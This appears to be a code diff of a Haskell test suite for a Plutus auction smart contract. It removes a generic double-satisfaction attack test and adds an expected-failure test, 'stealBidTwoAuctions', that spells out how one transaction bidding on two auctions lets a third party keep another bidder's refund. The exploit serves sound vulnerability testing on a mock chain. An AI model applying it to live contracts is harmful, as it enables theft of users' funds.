@@ -20,6 +20,7 @@ import qualified Ledger.Ada as Ada
 import qualified Ledger.Value as Value
 import Optics.Core
 import Test.Tasty
+import Test.Tasty.ExpectedFailure
 import Test.Tasty.HUnit
 
 -- * Parameters and initial distributions
@@ -166,60 +167,6 @@ tryDatumHijack =
     )
     (noBids <|> oneBid <|> twoBids)
 
--- | Double satisfaction attack
-tryDoubleSat :: MonadModalMockChain m => m ()
-tryDoubleSat = do
-  t0 <- currentTime
-  (p, q) <- A.txOpen (bananaParams t0) `as` wallet 1
-  somewhere
-    ( doubleSatAttack
-        -- look at all 'SpendsScript' constraints going to a validator of type
-        -- 'A.Auction'.
-        (spendsScriptConstraintsT % spendsScriptConstraintTypeP @A.Auction)
-        -- If the constraint uses the 'A.Hammer' redeemer, try consuming an
-        -- additional UTxO from the same validator with one of six different
-        -- 'A.Bid' redeemers.
-        ( \mcst (val, r, _) ->
-            let utxos =
-                  scriptUtxosSuchThatMcst
-                    mcst
-                    val
-                    (\_ _ -> True)
-             in case r of
-                  A.Hammer ->
-                    concatMap
-                      ( \utxo ->
-                          map
-                            ( \(amount, bidder) ->
-                                toConstraints $
-                                  SpendsScript
-                                    val
-                                    (A.Bid $ A.BidderInfo amount bidder)
-                                    (fst utxo)
-                            )
-                            [ (5, walletPKHash $ wallet 1),
-                              (5, walletPKHash $ wallet 6),
-                              (4, walletPKHash $ wallet 1),
-                              (4, walletPKHash $ wallet 6),
-                              (3, walletPKHash $ wallet 1),
-                              (3, walletPKHash $ wallet 6)
-                            ]
-                      )
-                      utxos
-                  _ -> []
-        )
-        -- pay the surplus to wallet 6
-        (wallet 6)
-        -- try each extra redeemer on a different modified transaction
-        AllSeparate
-    )
-    ( do
-        A.txBid p 3 `as` wallet 2
-        A.txBid p 4 `as` wallet 3
-        awaitTime (A.bidDeadline p + 1)
-        A.txHammer p q
-    )
-
 -- | datum tampering attack that tries to change the bidder to wallet 6 on the
 -- 'Bidding' datum
 tryTamperDatum :: (Alternative m, MonadModalMockChain m) => m ()
@@ -251,17 +198,87 @@ attacks =
           isCekEvaluationFailure
           testInit
           tryDatumHijack,
-      testCase "double satisfaction" $
-        testFailsFrom'
-          isCekEvaluationFailure
-          testInit
-          tryDoubleSat,
       testCase "datum tampering" $
         testFailsFrom'
           isCekEvaluationFailure
           testInit
           tryTamperDatum
     ]
+
+-- * known vulnerabilities
+
+otherParams :: L.POSIXTime -> A.StaticValParams
+otherParams t =
+  A.StaticValParams
+    { A.lot' = banana 3,
+      A.minBid' = 5,
+      A.bidDeadline' = t + 90_000
+    }
+
+-- | This exploits the double satifsaction vulnerability in 'validBid' to steal
+-- a bid. The idea is to bid on two auctions that currently have the same
+-- highest bidder Bob, but only return one of the two bids to Bob in doing so.
+stealBidTwoAuctions :: MonadModalMockChain m => m ()
+stealBidTwoAuctions = do
+  t0 <- currentTime
+  -- Alice opens two auctions (it does not matter that they both belong to her,
+  -- this vulnerability applies to any two auctions)
+  (p, q) <- A.txOpen (bananaParams t0) `as` alice
+  (pOther, qOther) <- A.txOpen (otherParams t0) `as` alice
+  -- People now bid on the auctions until Bob is the highest bidder on both
+  -- auctions.
+  A.txBid p 40_000_000 `as` bob
+  A.txBid pOther 60_000_000 `as` bob
+  -- The UTxO at the first auction that represents the current state:
+  [(theLastBidUtxo, _)] <- scriptUtxosSuchThat (A.auctionValidator p) (\_ _ -> True)
+  -- Eve now bids on the second auction. Among other things this ensures that
+  -- there's an output containing 60_000_000 Lovelace to Bob on the
+  -- transaction. This means that, if she simultaneously bids on the first
+  -- auction, she can fool the validator of the first auction, which expects an
+  -- output of at least 40_000_000 Lovelace to go to Bob. She can keep this
+  -- money to herself, effectively stealing Bob's bid on the first auction.
+  A.txBid pOther 70_000_000 `as` eve
+    `withTweak` addConstraintsTweak
+      ( [ Before (A.bidDeadline p),
+          SpendsScript
+            (A.auctionValidator p)
+            (A.Bid (A.BidderInfo 50_000_000 (walletPKHash eve)))
+            theLastBidUtxo
+        ]
+          :=>: [ paysScript
+                   (A.auctionValidator p)
+                   (A.Bidding (A.BidderInfo 50_000_000 (walletPKHash eve)))
+                   ( A.lot p
+                       <> Value.assetClassValue (A.threadTokenAssetClass p) 1
+                       <> Ada.lovelaceValueOf 50_000_000
+                   ),
+                 paysPK
+                   (walletPKHash eve)
+                   (Ada.lovelaceValueOf 40_000_000)
+               ]
+      )
+  -- Both auctions are closed normally. Eve is the highest bidder on both of
+  -- them.
+  awaitTime (A.bidDeadline p + 1)
+  A.txHammer p q
+  awaitTime (A.bidDeadline pOther + 1)
+  A.txHammer pOther qOther
+  where
+    alice = wallet 1
+    bob = wallet 3
+    eve = wallet 6
+
+vulns :: TestTree
+vulns =
+  testGroup "known vulnerabilities and exploits" $
+    map
+      expectFail
+      [ testCase "stealing a bid from another auction" $
+          testFailsFrom'
+            isCekEvaluationFailure
+            testInit
+            stealBidTwoAuctions
+      ]
 
 -- * Comparing two outcomes with 'testBinaryRelatedBy'
 
@@ -304,5 +321,6 @@ tests =
     [ successfulSingle,
       failingSingle,
       attacks,
+      vulns,
       miscTests
     ]
